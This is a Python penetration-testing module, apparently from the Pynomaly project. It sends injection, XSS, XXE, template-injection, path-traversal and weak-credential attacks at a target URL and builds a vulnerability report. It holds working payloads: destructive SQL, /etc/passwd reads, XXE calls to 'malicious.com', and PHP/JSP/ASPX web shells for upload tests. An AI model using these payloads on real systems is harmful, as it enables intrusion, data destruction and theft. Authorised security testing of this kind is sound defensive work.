"""
Advanced Penetration Testing Suite for Pynomaly
This module contains advanced penetration testing scenarios for comprehensive security assessment.
"""

import asyncio
import base64
import hashlib
import json
import os
import random
import socket
import ssl
import string
import struct
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any
from urllib.parse import urljoin, urlparse, parse_qs

import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import jwt
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend


class PenetrationTestFramework:
    """Advanced penetration testing framework"""
    
    def __init__(self, target_url: str, config: Dict = None):
        self.target_url = target_url
        self.config = config or {}
        self.session = self._create_session()
        self.vulnerabilities = []
        self.test_results = {
            "critical": [],
            "high": [],
            "medium": [],
            "low": [],
            "info": []
        }
        
        # Attack payloads
        self.payloads = self._load_payloads()
        
        # Test credentials
        self.test_credentials = {
            "admin": ["admin", "password", "123456", "admin123", "root"],
            "user": ["user", "password", "123456", "user123", "guest"],
            "test": ["test", "password", "123456", "test123", "demo"]
        }
        
        # Common directories and files
        self.common_paths = [
            "/admin", "/api", "/backup", "/config", "/logs", "/tmp",
            "/upload", "/downloads", "/files", "/data", "/db",
            "/.git", "/.env", "/.htaccess", "/web.config",
            "/phpinfo.php", "/info.php", "/test.php", "/admin.php",
            "/login.php", "/dashboard.php", "/config.php"
        ]
        
        # Network scanning results
        self.network_info = {}
        
        # Session management
        self.authenticated_session = None
        self.current_user = None
        
    def _create_session(self) -> requests.Session:
        """Create HTTP session with retry strategy"""
        session = requests.Session()
        
        # Configure retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        # Set headers
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        })
        
        return session
    
    def _load_payloads(self) -> Dict[str, List[str]]:
        """Load attack payloads"""
        return {
            "sql_injection": [
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "' OR 1=1 --",
                "' OR 1=1 #",
                "' OR 1=1/*",
                "') OR '1'='1' --",
                "') OR ('1'='1' --",
                "' OR 1=1 UNION SELECT null,null,null --",
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --",
                "'; DROP TABLE users; --",
                "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
                "' AND (SELECT COUNT(*) FROM users) > 0 --",
                "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --"
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<body onload=alert('XSS')>",
                "<input autofocus onfocus=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
                "<audio src=x onerror=alert('XSS')>",
                "<video src=x onerror=alert('XSS')>",
                "<object data=javascript:alert('XSS')>",
                "<embed src=javascript:alert('XSS')>",
                "<link rel=stylesheet href=javascript:alert('XSS')>",
                "<style>@import'javascript:alert(\"XSS\")';</style>",
                "<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>"
            ],
            "command_injection": [
                "; ls -la",
                "&& ls -la",
                "| ls -la",
                "; cat /etc/passwd",
                "&& cat /etc/passwd",
                "| cat /etc/passwd",
                "; whoami",
                "&& whoami",
                "| whoami",
                "; id",
                "&& id",
                "| id",
                "; netstat -an",
                "&& netstat -an",
                "| netstat -an",
                "; ps aux",
                "&& ps aux",
                "| ps aux"
            ],
            "ldap_injection": [
                "*)(&(objectClass=*)",
                "*)(|(password=*))",
                "*)(|(uid=*))",
                "*)(|(cn=*))",
                "*)(|(mail=*))",
                "*)(userPassword=*)",
                "*)(|(objectClass=*))",
                "*)(&(uid=*))",
                "*)(&(cn=*))",
                "*))%00"
            ],
            "xml_injection": [
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///windows/system32/drivers/etc/hosts'>]><root>&test;</root>",
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://malicious.com/malware'>]><root>&test;</root>",
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'>%xxe;]>",
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % xxe SYSTEM 'http://malicious.com/malware'>%xxe;]>"
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc//passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
                "..////..////..////etc////passwd",
                "..\\....\\....\\....\\etc\\passwd"
            ],
            "file_inclusion": [
                "../../../../etc/passwd",
                "../../../../windows/system32/drivers/etc/hosts",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "php://filter/read=convert.base64-encode/resource=../config.php",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                "expect://ls",
                "file:///etc/passwd",
                "file:///windows/system32/drivers/etc/hosts",
                "http://malicious.com/malware.txt"
            ],
            "nosql_injection": [
                "true, $where: '1 == 1'",
                ", $where: '1 == 1'",
                "$where: '1 == 1'",
                "', $where: '1 == 1', $comment: 'successful MongoDB injection'",
                "'; return db.users.find(); var dummy='",
                "'; return db.users.drop(); var dummy='",
                "[$ne]",
                "[$regex]",
                "[$where]",
                "[$gt]",
                "[$lt]",
                "[$exists]"
            ],
            "template_injection": [
                "{{7*7}}",
                "${7*7}",
                "<%=7*7%>",
                "#{7*7}",
                "{{config}}",
                "{{config.items()}}",
                "{{request}}",
                "{{request.environ}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
            ]
        }
    
    def record_vulnerability(self, vuln_type: str, severity: str, description: str, 
                           url: str, payload: str = "", response: str = ""):
        """Record discovered vulnerability"""
        vulnerability = {
            "type": vuln_type,
            "severity": severity,
            "description": description,
            "url": url,
            "payload": payload,
            "response": response[:1000] if response else "",
            "timestamp": datetime.now().isoformat()
        }
        
        self.vulnerabilities.append(vulnerability)
        self.test_results[severity].append(vulnerability)
    
    def make_request(self, method: str, url: str, **kwargs) -> requests.Response:
        """Make HTTP request with error handling"""
        try:
            full_url = urljoin(self.target_url, url)
            response = self.session.request(method, full_url, **kwargs)
            return response
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
            return None
    
    def test_information_disclosure(self):
        """Test for information disclosure vulnerabilities"""
        print("Testing information disclosure...")
        
        # Test for sensitive files
        sensitive_files = [
            "/.env", "/.git/config", "/.htaccess", "/web.config",
            "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
            "/phpinfo.php", "/info.php", "/test.php",
            "/backup.sql", "/dump.sql", "/config.bak",
            "/logs/access.log", "/logs/error.log",
            "/admin/logs", "/admin/config"
        ]
        
        for file_path in sensitive_files:
            response = self.make_request("GET", file_path)
            if response and response.status_code == 200:
                if len(response.text) > 100:  # Substantial content
                    self.record_vulnerability(
                        "information_disclosure",
                        "medium",
                        f"Sensitive file exposed: {file_path}",
                        file_path,
                        response=response.text[:500]
                    )
        
        # Test for directory listing
        directories = ["/backup", "/logs", "/tmp", "/uploads", "/files"]
        for directory in directories:
            response = self.make_request("GET", directory)
            if response and response.status_code == 200:
                if "Index of" in response.text or "Directory listing" in response.text:
                    self.record_vulnerability(
                        "information_disclosure",
                        "medium",
                        f"Directory listing enabled: {directory}",
                        directory,
                        response=response.text[:500]
                    )
        
        # Test for error message information disclosure
        error_payloads = [
            "/nonexistent",
            "/admin/nonexistent",
            "/api/nonexistent",
            "//invalid//path",
            "/test?param=",
            "/search?q=",
            "/login?username=&password="
        ]
        
        for payload in error_payloads:
            response = self.make_request("GET", payload)
            if response and response.status_code in [400, 404, 500]:
                response_text = response.text.lower()
                if any(keyword in response_text for keyword in [
                    "traceback", "exception", "error", "stack trace", 
                    "debug", "sql", "mysql", "postgres", "mongodb",
                    "internal server error", "application error"
                ]):
                    self.record_vulnerability(
                        "information_disclosure",
                        "low",
                        f"Error message disclosure: {payload}",
                        payload,
                        response=response.text[:500]
                    )
    
    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        print("Testing SQL injection...")
        
        # Test endpoints that might be vulnerable
        endpoints = [
            "/api/v1/search",
            "/api/v1/users",
            "/api/v1/login",
            "/search",
            "/login",
            "/admin/users",
            "/admin/search"
        ]
        
        for endpoint in endpoints:
            for payload in self.payloads["sql_injection"]:
                # Test GET parameters
                response = self.make_request("GET", f"{endpoint}?q={payload}")
                if response:
                    self._check_sql_injection_response(response, endpoint, payload)
                
                # Test POST data
                response = self.make_request("POST", endpoint, json={"q": payload})
                if response:
                    self._check_sql_injection_response(response, endpoint, payload)
                
                # Test headers
                response = self.make_request("GET", endpoint, headers={"X-Search": payload})
                if response:
                    self._check_sql_injection_response(response, endpoint, payload)
    
    def _check_sql_injection_response(self, response: requests.Response, 
                                    endpoint: str, payload: str):
        """Check response for SQL injection indicators"""
        response_text = response.text.lower()
        
        # Check for SQL error messages
        sql_errors = [
            "sql syntax", "mysql", "postgresql", "oracle", "sqlite",
            "syntax error", "invalid query", "database error",
            "you have an error in your sql syntax",
            "warning: mysql", "error: postgresql",
            "ora-", "sqlite3", "sqlstate"
        ]
        
        if any(error in response_text for error in sql_errors):
            self.record_vulnerability(
                "sql_injection",
                "critical",
                f"SQL injection vulnerability detected in {endpoint}",
                endpoint,
                payload,
                response.text[:500]
            )
        
        # Check for boolean-based SQL injection
        if response.status_code == 200 and len(response.text) > 0:
            # Time-based test
            time_payload = payload.replace("--", "AND (SELECT COUNT(*) FROM users) > 0 --")
            time_response = self.make_request("GET", f"{endpoint}?q={time_payload}")
            
            if time_response and abs(len(time_response.text) - len(response.text)) > 100:
                self.record_vulnerability(
                    "sql_injection",
                    "high",
                    f"Possible boolean-based SQL injection in {endpoint}",
                    endpoint,
                    payload,
                    response.text[:500]
                )
    
    def test_xss_vulnerabilities(self):
        """Test for Cross-Site Scripting vulnerabilities"""
        print("Testing XSS vulnerabilities...")
        
        # Test different types of XSS
        xss_contexts = [
            ("reflected", "GET"),
            ("stored", "POST"),
            ("dom", "GET")
        ]
        
        endpoints = [
            "/search", "/comment", "/feedback", "/contact",
            "/api/v1/search", "/api/v1/comment", "/api/v1/feedback"
        ]
        
        for endpoint in endpoints:
            for xss_type, method in xss_contexts:
                for payload in self.payloads["xss"]:
                    if method == "GET":
                        response = self.make_request("GET", f"{endpoint}?q={payload}")
                    else:
                        response = self.make_request("POST", endpoint, json={"content": payload})
                    
                    if response and self._check_xss_response(response, payload):
                        self.record_vulnerability(
                            "xss",
                            "high",
                            f"{xss_type.title()} XSS vulnerability in {endpoint}",
                            endpoint,
                            payload,
                            response.text[:500]
                        )
    
    def _check_xss_response(self, response: requests.Response, payload: str) -> bool:
        """Check response for XSS indicators"""
        response_text = response.text
        
        # Check if payload is reflected without encoding
        if payload in response_text:
            return True
        
        # Check for partial payload reflection
        dangerous_tags = ["<script", "<img", "<iframe", "<svg", "<object"]
        if any(tag in response_text for tag in dangerous_tags):
            return True
        
        return False
    
    def test_command_injection(self):
        """Test for command injection vulnerabilities"""
        print("Testing command injection...")
        
        endpoints = [
            "/api/v1/system/command",
            "/api/v1/export",
            "/api/v1/import",
            "/admin/system",
            "/admin/export",
            "/system/ping",
            "/system/traceroute"
        ]
        
        for endpoint in endpoints:
            for payload in self.payloads["command_injection"]:
                # Test different parameters
                for param in ["cmd", "command", "exec", "system", "run"]:
                    response = self.make_request("POST", endpoint, json={param: payload})
                    if response:
                        self._check_command_injection_response(response, endpoint, payload)
    
    def _check_command_injection_response(self, response: requests.Response, 
                                        endpoint: str, payload: str):
        """Check response for command injection indicators"""
        response_text = response.text.lower()
        
        # Check for command output
        command_outputs = [
            "uid=", "gid=", "groups=",  # id command
            "total ", "drwx", "-rw-",   # ls command
            "root:", "bin:", "daemon:", "sys:",  # /etc/passwd
            "listening on", "active connections",  # netstat
            "process id", "ppid", "user",  # ps
            "command not found", "permission denied",
            "no such file or directory"
        ]
        
        if any(output in response_text for output in command_outputs):
            self.record_vulnerability(
                "command_injection",
                "critical",
                f"Command injection vulnerability in {endpoint}",
                endpoint,
                payload,
                response.text[:500]
            )
    
    def test_file_upload_vulnerabilities(self):
        """Test for file upload vulnerabilities"""
        print("Testing file upload vulnerabilities...")
        
        upload_endpoints = [
            "/api/v1/upload",
            "/api/v1/files/upload",
            "/upload",
            "/admin/upload",
            "/user/avatar"
        ]
        
        # Test different file types
        malicious_files = [
            ("shell.php", "<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("shell.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/x-jsp"),
            ("shell.aspx", "<%@ Page Language=\"C#\" %><%Response.Write(System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \" + Request.QueryString[\"cmd\"]).StandardOutput.ReadToEnd());%>", "application/x-aspx"),
            ("test.exe", "MZ" + "A" * 100, "application/octet-stream"),
            ("test.html", "<script>alert('XSS')</script>", "text/html"),
            ("test.svg", "<svg onload=alert('XSS')>", "image/svg+xml")
        ]
        
        for endpoint in upload_endpoints:
            for filename, content, content_type in malicious_files:
                files = {"file": (filename, content, content_type)}
                response = self.make_request("POST", endpoint, files=files)
                
                if response and response.status_code == 200:
                    # Check if file was uploaded successfully
                    if "success" in response.text.lower() or "uploaded" in response.text.lower():
                        self.record_vulnerability(
                            "file_upload",
                            "high",
                            f"Malicious file upload possible: {filename}",
                            endpoint,
                            filename,
                            response.text[:500]
                        )
    
    def test_authentication_bypass(self):
        """Test for authentication bypass vulnerabilities"""
        print("Testing authentication bypass...")
        
        auth_endpoints = [
            "/login", "/admin/login", "/api/v1/login",
            "/signin", "/admin/signin", "/api/v1/signin"
        ]
        
        # Test common authentication bypass techniques
        bypass_payloads = [
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "admin", "password": "123456"},
            {"username": "admin", "password": ""},
            {"username": "admin' OR '1'='1' --", "password": "anything"},
            {"username": "admin", "password": "' OR '1'='1' --"},
            {"username": "admin", "password": "admin' OR '1'='1' --"},
            {"username": "admin/*", "password": "*/admin"},
            {"username": "admin\x00", "password": "admin"},
            {"username": "admin\r\n", "password": "admin"}
        ]
        
        for endpoint in auth_endpoints:
            for payload in bypass_payloads:
                response = self.make_request("POST", endpoint, json=payload)
                if response:
                    self._check_auth_bypass_response(response, endpoint, payload)
    
    def _check_auth_bypass_response(self, response: requests.Response, 
                                  endpoint: str, payload: Dict):
        """Check response for authentication bypass indicators"""
        response_text = response.text.lower()
        
        # Check for successful authentication indicators
        success_indicators = [
            "welcome", "dashboard", "profile", "logout",
            "success", "authenticated", "logged in",
            "token", "session", "cookie"
        ]
        
        if response.status_code == 200 and any(indicator in response_text for indicator in success_indicators):
            self.record_vulnerability(
                "authentication_bypass",
                "critical",
                f"Authentication bypass vulnerability in {endpoint}",
                endpoint,
                str(payload),
                response.text[:500]
            )
        
        # Check for redirect to authenticated area
        if response.status_code in [302, 301, 303, 307, 308]:
            location = response.headers.get("Location", "")
            if any(path in location for path in ["/dashboard", "/admin", "/profile", "/home"]):
                self.record_vulnerability(
                    "authentication_bypass",
                    "critical",
                    f"Authentication bypass via redirect in {endpoint}",
                    endpoint,
                    str(payload),
                    f"Redirect to: {location}"
                )
    
    def test_session_management(self):
        """Test session management vulnerabilities"""
        print("Testing session management...")
        
        # Test session fixation
        self._test_session_fixation()
        
        # Test session hijacking
        self._test_session_hijacking()
        
        # Test session timeout
        self._test_session_timeout()
        
        # Test concurrent sessions
        self._test_concurrent_sessions()
    
    def _test_session_fixation(self):
        """Test for session fixation vulnerabilities"""
        # Get initial session
        response = self.make_request("GET", "/")
        if response:
            initial_cookies = response.cookies
            
            # Attempt login
            login_response = self.make_request("POST", "/login", 
                                             json={"username": "admin", "password": "admin"},
                                             cookies=initial_cookies)
            
            if login_response and login_response.status_code == 200:
                # Check if session ID changed
                if login_response.cookies == initial_cookies:
                    self.record_vulnerability(
                        "session_fixation",
                        "medium",
                        "Session ID not regenerated after login",
                        "/login",
                        "Session fixation vulnerability"
                    )
    
    def _test_session_hijacking(self):
        """Test for session hijacking vulnerabilities"""
        # Test weak session tokens
        response = self.make_request("GET", "/")
        if response and response.cookies:
            for cookie in response.cookies:
                if len(cookie.value) < 20:
                    self.record_vulnerability(
                        "session_hijacking",
                        "medium",
                        f"Weak session token: {cookie.name}",
                        "/",
                        f"Token: {cookie.value}"
                    )
    
    def _test_session_timeout(self):
        """Test session timeout configuration"""
        # This would require authenticated session
        pass
    
    def _test_concurrent_sessions(self):
        """Test concurrent session handling"""
        # This would require multiple authenticated sessions
        pass
    
    def test_authorization_bypass(self):
        """Test for authorization bypass vulnerabilities"""
        print("Testing authorization bypass...")
        
        # Test direct object reference
        self._test_direct_object_reference()
        
        # Test privilege escalation
        self._test_privilege_escalation()
        
        # Test horizontal privilege escalation
        self._test_horizontal_privilege_escalation()
    
    def _test_direct_object_reference(self):
        """Test for direct object reference vulnerabilities"""
        # Test common object references
        object_endpoints = [
            "/api/v1/users/1",
            "/api/v1/users/2",
            "/api/v1/users/3",
            "/api/v1/files/1",
            "/api/v1/files/2",
            "/api/v1/documents/1",
            "/api/v1/documents/2"
        ]
        
        for endpoint in object_endpoints:
            response = self.make_request("GET", endpoint)
            if response and response.status_code == 200:
                # Check if sensitive data is exposed
                response_text = response.text.lower()
                if any(keyword in response_text for keyword in [
                    "password", "email", "phone", "address", "ssn",
                    "credit_card", "token", "secret", "private"
                ]):
                    self.record_vulnerability(
                        "direct_object_reference",
                        "high",
                        f"Direct object reference vulnerability: {endpoint}",
                        endpoint,
                        "Unauthorized access to sensitive data"
                    )
    
    def _test_privilege_escalation(self):
        """Test for privilege escalation vulnerabilities"""
        # Test modifying user roles
        escalation_payloads = [
            {"role": "admin"},
            {"admin": True},
            {"is_admin": True},
            {"permissions": ["admin", "read", "write"]},
            {"user_type": "admin"}
        ]
        
        for payload in escalation_payloads:
            response = self.make_request("PUT", "/api/v1/users/1", json=payload)
            if response and response.status_code == 200:
                self.record_vulnerability(
                    "privilege_escalation",
                    "critical",
                    "Privilege escalation vulnerability",
                    "/api/v1/users/1",
                    str(payload),
                    response.text[:500]
                )
    
    def _test_horizontal_privilege_escalation(self):
        """Test for horizontal privilege escalation"""
        # Test accessing other users' data
        user_endpoints = [
            "/api/v1/users/1/profile",
            "/api/v1/users/2/profile",
            "/api/v1/users/1/settings",
            "/api/v1/users/2/settings"
        ]
        
        for endpoint in user_endpoints:
            response = self.make_request("GET", endpoint)
            if response and response.status_code == 200:
                if "profile" in response.text or "settings" in response.text:
                    self.record_vulnerability(
                        "horizontal_privilege_escalation",
                        "high",
                        f"Horizontal privilege escalation: {endpoint}",
                        endpoint,
                        "Unauthorized access to other users' data"
                    )
    
    def test_business_logic_flaws(self):
        """Test for business logic vulnerabilities"""
        print("Testing business logic flaws...")
        
        # Test price manipulation
        self._test_price_manipulation()
        
        # Test quantity bypass
        self._test_quantity_bypass()
        
        # Test workflow bypass
        self._test_workflow_bypass()
    
    def _test_price_manipulation(self):
        """Test for price manipulation vulnerabilities"""
        # Test negative prices
        price_payloads = [
            {"price": -100},
            {"price": 0},
            {"price": 0.01},
            {"amount": -100},
            {"total": -100}
        ]
        
        for payload in price_payloads:
            response = self.make_request("POST", "/api/v1/orders", json=payload)
            if response and response.status_code == 200:
                self.record_vulnerability(
                    "price_manipulation",
                    "high",
                    "Price manipulation vulnerability",
                    "/api/v1/orders",
                    str(payload),
                    response.text[:500]
                )
    
    def _test_quantity_bypass(self):
        """Test for quantity bypass vulnerabilities"""
        # Test excessive quantities
        quantity_payloads = [
            {"quantity": 999999},
            {"quantity": -1},
            {"quantity": 0},
            {"count": 999999}
        ]
        
        for payload in quantity_payloads:
            response = self.make_request("POST", "/api/v1/cart", json=payload)
            if response and response.status_code == 200:
                self.record_vulnerability(
                    "quantity_bypass",
                    "medium",
                    "Quantity bypass vulnerability",
                    "/api/v1/cart",
                    str(payload),
                    response.text[:500]
                )
    
    def _test_workflow_bypass(self):
        """Test for workflow bypass vulnerabilities"""
        # Test skipping workflow steps
        workflow_endpoints = [
            "/api/v1/checkout/step1",
            "/api/v1/checkout/step2",
            "/api/v1/checkout/step3",
            "/api/v1/checkout/complete"
        ]
        
        # Try to access final step directly
        response = self.make_request("POST", "/api/v1/checkout/complete")
        if response and response.status_code == 200:
            self.record_vulnerability(
                "workflow_bypass",
                "medium",
                "Workflow bypass vulnerability",
                "/api/v1/checkout/complete",
                "Direct access to final step"
            )
    
    def test_race_conditions(self):
        """Test for race condition vulnerabilities"""
        print("Testing race conditions...")
        
        # Test concurrent requests
        def make_concurrent_request(endpoint, payload):
            return self.make_request("POST", endpoint, json=payload)
        
        # Test race conditions in critical operations
        critical_endpoints = [
            "/api/v1/transfer",
            "/api/v1/purchase",
            "/api/v1/withdraw",
            "/api/v1/deposit"
        ]
        
        for endpoint in critical_endpoints:
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = []
                for _ in range(10):
                    future = executor.submit(make_concurrent_request, endpoint, {"amount": 100})
                    futures.append(future)
                
                responses = [future.result() for future in futures if future.result()]
                successful_responses = [r for r in responses if r.status_code == 200]
                
                if len(successful_responses) > 1:
                    self.record_vulnerability(
                        "race_condition",
                        "high",
                        f"Race condition vulnerability in {endpoint}",
                        endpoint,
                        f"Multiple concurrent requests succeeded: {len(successful_responses)}"
                    )
    
    def test_cryptographic_flaws(self):
        """Test for cryptographic vulnerabilities"""
        print("Testing cryptographic flaws...")
        
        # Test weak encryption
        self._test_weak_encryption()
        
        # Test JWT vulnerabilities
        self._test_jwt_vulnerabilities()
        
        # Test SSL/TLS configuration
        self._test_ssl_configuration()
    
    def _test_weak_encryption(self):
        """Test for weak encryption implementation"""
        # Test if sensitive data is encrypted
        endpoints = [
            "/api/v1/users/1",
            "/api/v1/profile",
            "/api/v1/settings"
        ]
        
        for endpoint in endpoints:
            response = self.make_request("GET", endpoint)
            if response and response.status_code == 200:
                # Check for unencrypted sensitive data
                response_text = response.text.lower()
                if any(keyword in response_text for keyword in [
                    "password", "secret", "token", "key", "hash"
                ]):
                    # Check if it looks like plaintext
                    if not any(char in response_text for char in ['$', '{', '}']):
                        self.record_vulnerability(
                            "weak_encryption",
                            "high",
                            f"Possible unencrypted sensitive data: {endpoint}",
                            endpoint,
                            "Sensitive data may not be encrypted"
                        )
    
    def _test_jwt_vulnerabilities(self):
        """Test for JWT vulnerabilities"""
        # Attempt to get JWT token
        response = self.make_request("POST", "/api/v1/login", 
                                   json={"username": "admin", "password": "admin"})
        
        if response and response.status_code == 200:
            try:
                token = response.json().get("token") or response.json().get("access_token")
                if token:
                    # Test JWT manipulation
                    self._test_jwt_manipulation(token)
                    
                    # Test JWT algorithm confusion
                    self._test_jwt_algorithm_confusion(token)
                    
                    # Test JWT weak secret
                    self._test_jwt_weak_secret(token)
            except:
                pass
    
    def _test_jwt_manipulation(self, token: str):
        """Test JWT token manipulation"""
        try:
            # Decode without verification
            payload = jwt.decode(token, options={"verify_signature": False})
            
            # Modify payload
            payload["role"] = "admin"
            payload["admin"] = True
            
            # Create new token with same signature
            header, _, signature = token.split('.')
            new_payload = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip('=')
            
            manipulated_token = f"{header}.{new_payload}.{signature}"
            
            # Test manipulated token
            response = self.make_request("GET", "/api/v1/admin", 
                                       headers={"Authorization": f"Bearer {manipulated_token}"})
            
            if response and response.status_code == 200:
                self.record_vulnerability(
                    "jwt_manipulation",
                    "critical",
                    "JWT token manipulation vulnerability",
                    "/api/v1/admin",
                    manipulated_token,
                    response.text[:500]
                )
        except Exception as e:
            pass
    
    def _test_jwt_algorithm_confusion(self, token: str):
        """Test JWT algorithm confusion attack"""
        try:
            # Try to use 'none' algorithm
            header = {"alg": "none", "typ": "JWT"}
            payload = jwt.decode(token, options={"verify_signature": False})
            
            # Create token with 'none' algorithm
            none_token = (
                base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=') +
                '.' +
                base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=') +
                '.'
            )
            
            # Test none token
            response = self.make_request("GET", "/api/v1/profile", 
                                       headers={"Authorization": f"Bearer {none_token}"})
            
            if response and response.status_code == 200:
                self.record_vulnerability(
                    "jwt_algorithm_confusion",
                    "critical",
                    "JWT algorithm confusion vulnerability",
                    "/api/v1/profile",
                    none_token,
                    "None algorithm accepted"
                )
        except Exception as e:
            pass
    
    def _test_jwt_weak_secret(self, token: str):
        """Test JWT weak secret"""
        # Common weak secrets
        weak_secrets = [
            "secret", "password", "123456", "admin", "key",
            "jwt_secret", "my_secret", "super_secret", "test"
        ]
        
        for secret in weak_secrets:
            try:
                decoded = jwt.decode(token, secret, algorithms=["HS256"])
                self.record_vulnerability(
                    "jwt_weak_secret",
                    "critical",
                    f"JWT uses weak secret: {secret}",
                    "/api/v1/login",
                    secret,
                    "Weak JWT secret discovered"
                )
                break
            except:
                continue
    
    def _test_ssl_configuration(self):
        """Test SSL/TLS configuration"""
        if not self.target_url.startswith("https://"):
            self.record_vulnerability(
                "ssl_configuration",
                "high",
                "Application not using HTTPS",
                "/",
                "HTTP protocol used"
            )
            return
        
        # Test SSL certificate
        try:
            hostname = urlparse(self.target_url).hostname
            port = urlparse(self.target_url).port or 443
            
            context = ssl.create_default_context()
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Check certificate expiration
                    not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    if not_after < datetime.now() + timedelta(days=30):
                        self.record_vulnerability(
                            "ssl_configuration",
                            "medium",
                            "SSL certificate expiring soon",
                            "/",
                            f"Expires: {not_after}"
                        )
        except Exception as e:
            self.record_vulnerability(
                "ssl_configuration",
                "medium",
                f"SSL configuration issue: {e}",
                "/",
                str(e)
            )
    
    def generate_report(self) -> Dict:
        """Generate comprehensive penetration testing report"""
        total_vulnerabilities = len(self.vulnerabilities)
        
        report = {
            "summary": {
                "target": self.target_url,
                "test_date": datetime.now().isoformat(),
                "total_vulnerabilities": total_vulnerabilities,
                "critical": len(self.test_results["critical"]),
                "high": len(self.test_results["high"]),
                "medium": len(self.test_results["medium"]),
                "low": len(self.test_results["low"]),
                "info": len(self.test_results["info"])
            },
            "vulnerabilities": self.vulnerabilities,
            "detailed_results": self.test_results,
            "recommendations": self._generate_recommendations()
        }
        
        return report
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        # Critical vulnerabilities
        if self.test_results["critical"]:
            recommendations.append("CRITICAL: Address all critical vulnerabilities immediately")
            recommendations.append("- Implement proper input validation and sanitization")
            recommendations.append("- Fix authentication and authorization bypasses")
            recommendations.append("- Review and fix SQL injection vulnerabilities")
            recommendations.append("- Implement proper session management")
        
        # High vulnerabilities
        if self.test_results["high"]:
            recommendations.append("HIGH: Address high-severity vulnerabilities")
            recommendations.append("- Implement XSS protection")
            recommendations.append("- Fix authorization bypass issues")
            recommendations.append("- Secure file upload functionality")
            recommendations.append("- Implement proper cryptographic controls")
        
        # Medium vulnerabilities
        if self.test_results["medium"]:
            recommendations.append("MEDIUM: Address medium-severity vulnerabilities")
            recommendations.append("- Implement security headers")
            recommendations.append("- Fix information disclosure issues")
            recommendations.append("- Implement rate limiting")
            recommendations.append("- Review business logic flaws")
        
        # General recommendations
        recommendations.extend([
            "- Implement Web Application Firewall (WAF)",
            "- Regular security testing and code review",
            "- Security awareness training for developers",
            "- Implement logging and monitoring",
            "- Regular security updates and patches"
        ])
        
        return recommendations
    
    def run_comprehensive_test(self) -> Dict:
        """Run comprehensive penetration test"""
        print(f"Starting comprehensive penetration test for {self.target_url}")
        
        # Run all tests
        self.test_information_disclosure()
        self.test_sql_injection()
        self.test_xss_vulnerabilities()
        self.test_command_injection()
        self.test_file_upload_vulnerabilities()
        self.test_authentication_bypass()
        self.test_session_management()
        self.test_authorization_bypass()
        self.test_business_logic_flaws()
        self.test_race_conditions()
        self.test_cryptographic_flaws()
        
        # Generate report
        report = self.generate_report()
        
        print(f"\nPenetration test completed!")
        print(f"Total vulnerabilities found: {report['summary']['total_vulnerabilities']}")
        print(f"Critical: {report['summary']['critical']}")
        print(f"High: {report['summary']['high']}")
        print(f"Medium: {report['summary']['medium']}")
        print(f"Low: {report['summary']['low']}")
        
        return report


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python penetration_tests.py <target_url>")
